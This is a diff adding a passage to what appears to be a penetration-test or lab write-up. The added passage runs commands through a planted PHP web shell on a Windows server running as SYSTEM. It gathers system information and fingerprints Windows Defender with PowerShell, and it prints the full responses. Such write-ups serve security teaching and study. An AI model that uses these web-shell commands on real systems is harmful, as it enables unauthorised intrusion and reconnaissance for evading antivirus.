@@ -1402,6 +1402,22 @@ And the web server is running as system:
 
     nt authority\system
 
+I got some information about the system:
+
+    http://10.200.95.31/images/ws.php?c=systeminfo
+Response:
+
+    Host Name: S-SRV01 OS Name: Microsoft Windows Server 2019 Datacenter OS Version: 10.0.17763
+Then finger print AV:
+
+    http://10.200.95.31/images/ws.php?c=powershell%20-c%20Get-MpComputerStatus
+
+Response:
+
+    AMEngineVersion : 1.1.18800.4 AMProductVersion : 4.18.2111.5 AMRunningMode : Normal AMServiceEnabled : True AMServiceVersion : 4.18.2111.5 AntispywareEnabled : True AntispywareSignatureAge : 906 AntispywareSignatureLastUpdated : 12/19/2021 8:25:06 AM AntispywareSignatureVersion : 1.355.510.0 AntivirusEnabled : True AntivirusSignatureAge : 906 AntivirusSignatureLastUpdated : 12/19/2021 8:25:08 AM AntivirusSignatureVersion : 1.355.510.0 BehaviorMonitorEnabled : True ComputerID : 2BBDBCD0-5284-4DC2-A485-BBF6999477D4 ComputerState : 0 DeviceControlDefaultEnforcement : N/A DeviceControlPoliciesLastUpdated : 6/12/2024 10:06:02 AM DeviceControlState : N/A FullScanAge : 4294967295 FullScanEndTime : FullScanStartTime : IoavProtectionEnabled : True IsTamperProtected : False IsVirtualMachine : True LastFullScanSource : 0 LastQuickScanSource : 2 NISEnabled : True ...
+
+So Defender is certainly running
+
 
 
     
